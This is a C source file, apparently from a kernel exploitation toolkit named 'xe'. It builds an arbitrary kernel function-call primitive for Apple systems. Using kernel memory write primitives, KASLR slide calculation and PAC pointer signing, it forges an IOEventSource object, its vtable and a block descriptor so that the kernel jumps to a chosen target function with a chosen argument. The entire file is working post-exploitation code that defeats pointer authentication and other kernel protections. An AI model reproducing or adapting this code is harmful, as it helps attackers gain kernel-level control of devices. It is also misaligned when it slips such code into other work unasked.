//
//  util_kfunc_basic.c
//  xe
//
//  Created by admin on 12/9/21.
//

#include <stdlib.h>

#include "util_kfunc_basic.h"
#include "kmem.h"
#include "slider.h"
#include "util_ptrauth.h"
#include "util_zalloc.h"
#include "util_pacda.h"
#include "platform_params.h"
#include "util_assert.h"


enum {
    BLOCK_DEALLOCATING =      (0x0001),// runtime
    BLOCK_REFCOUNT_MASK =     (0xfffe),// runtime
    BLOCK_INLINE_LAYOUT_STRING = (1 << 21), // compiler
    BLOCK_SMALL_DESCRIPTOR =  (1 << 22), // compiler
    BLOCK_IS_NOESCAPE =       (1 << 23), // compiler
    BLOCK_NEEDS_FREE =        (1 << 24),// runtime
    BLOCK_HAS_COPY_DISPOSE =  (1 << 25),// compiler
    BLOCK_HAS_CTOR =          (1 << 26),// compiler: helpers have C++ code
    BLOCK_IS_GC =             (1 << 27),// runtime
    BLOCK_IS_GLOBAL =         (1 << 28),// compiler
    BLOCK_USE_STRET =         (1 << 29),// compiler: undefined if !BLOCK_HAS_SIGNATURE
    BLOCK_HAS_SIGNATURE  =    (1 << 30),// compiler
    BLOCK_HAS_EXTENDED_LAYOUT=(1 << 31) // compiler
};


enum state {
    STATE_CREATED,
    STATE_BUILD,
};


struct xe_util_kfunc_basic {
    uintptr_t io_event_source;
    uintptr_t io_event_source_vtable;
    uintptr_t block;
    uintptr_t block_descriptor;
    
    xe_util_zalloc_t io_event_source_allocator;
    xe_util_zalloc_t block_allocator;
    
    enum state state;
};


uintptr_t xe_util_kfunc_sign_address(uintptr_t proc, uintptr_t address, uintptr_t ctx_base, uint16_t descriminator) {
    uintptr_t address_out;
    int error = xe_util_pacda_sign(proc, address, XE_PTRAUTH_BLEND_DISCRIMINATOR_WITH_ADDRESS(descriminator, ctx_base), &address_out);
    xe_assert_err(error);
    return address_out;
}


xe_util_kfunc_basic_t xe_util_kfunc_basic_create(uintptr_t proc, xe_util_zalloc_t io_event_source_allocator, xe_util_zalloc_t block_allocator, uint free_zone_idx) {
    uintptr_t free_zone = xe_util_zalloc_find_zone_at_index(free_zone_idx);
    xe_assert(xe_kmem_read_uint64(free_zone) == 0);
    uintptr_t io_event_source = xe_util_zalloc_alloc(io_event_source_allocator);
    uintptr_t block = xe_util_zalloc_alloc(block_allocator);
    uintptr_t io_event_source_vtable = xe_util_kfunc_sign_address(proc, xe_slider_slide(VAR_IO_EVENT_SOURCE_VTABLE + 0x10), io_event_source, 0xcda1);
    uintptr_t block_descriptor = xe_util_kfunc_sign_address(proc, free_zone, KMEM_OFFSET(block, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET), 0xc0bb);
    
    xe_util_kfunc_basic_t util = malloc(sizeof(struct xe_util_kfunc_basic));
    util->block = block;
    util->block_allocator = block_allocator;
    util->io_event_source = io_event_source;
    util->io_event_source_vtable = io_event_source_vtable;
    util->io_event_source_allocator = io_event_source_allocator;
    util->block_descriptor = block_descriptor;
    util->state = STATE_CREATED;
    
    return util;
}


void xe_util_kfunc_setup_block_descriptor(xe_util_kfunc_basic_t util, uintptr_t target_func) {
    xe_assert(util->state == STATE_CREATED);
    int64_t diff = (target_func - XE_PTRAUTH_STRIP(util->block_descriptor) - TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET);
    xe_assert(diff >= INT32_MIN && diff <= INT32_MAX);
    xe_kmem_write_int32(KMEM_OFFSET(XE_PTRAUTH_STRIP(util->block_descriptor), TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET), (int32_t)diff);
}


void xe_util_kfunc_setup_block(xe_util_kfunc_basic_t util, char arg0[8]) {
    xe_assert(util->state == STATE_CREATED);
    int32_t flags = (BLOCK_SMALL_DESCRIPTOR | BLOCK_NEEDS_FREE | BLOCK_HAS_COPY_DISPOSE) + 2;
    xe_kmem_write(util->block, arg0, 8);
    xe_kmem_write_int32(KMEM_OFFSET(util->block, TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET), flags);
    xe_kmem_write_uint64(KMEM_OFFSET(util->block, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET), util->block_descriptor);
}


void xe_util_kfunc_setup_event_source(xe_util_kfunc_basic_t util) {
    xe_assert(util->state == STATE_CREATED);
    uintptr_t event_source = util->io_event_source;
    xe_kmem_write_uint64(KMEM_OFFSET(event_source, TYPE_OS_OBJECT_MEM_VTABLE_OFFSET), util->io_event_source_vtable);
    uint32_t ref_count = 1 | (1ULL << 16);
    xe_kmem_write_uint32(KMEM_OFFSET(event_source, TYPE_OS_OBJECT_MEM_RETAIN_COUNT_OFFSET), ref_count);
    xe_kmem_write_uint64(KMEM_OFFSET(event_source, TYPE_IO_EVENT_SOURCE_MEM_ACTION_BLOCK_OFFSET), util->block);
    xe_kmem_write_uint32(KMEM_OFFSET(event_source, TYPE_IO_EVENT_SOURCE_MEM_FLAGS_OFFSET), 0x4);
}


uintptr_t xe_util_kfunc_build_event_source(xe_util_kfunc_basic_t util, uintptr_t target_func, char arg0[8]) {
    xe_assert(util->state == STATE_CREATED);
    
    xe_util_kfunc_setup_event_source(util);
    xe_util_kfunc_setup_block(util, arg0);
    xe_util_kfunc_setup_block_descriptor(util, target_func);
    
    util->state = STATE_BUILD;
    return util->io_event_source;
}


void xe_util_kfunc_reset(xe_util_kfunc_basic_t util) {
    xe_assert(util->state == STATE_BUILD);
    xe_util_zalloc_alloc_at(util->io_event_source_allocator, util->io_event_source);
    xe_util_zalloc_alloc_at(util->block_allocator, util->block);
    util->state = STATE_CREATED;
}
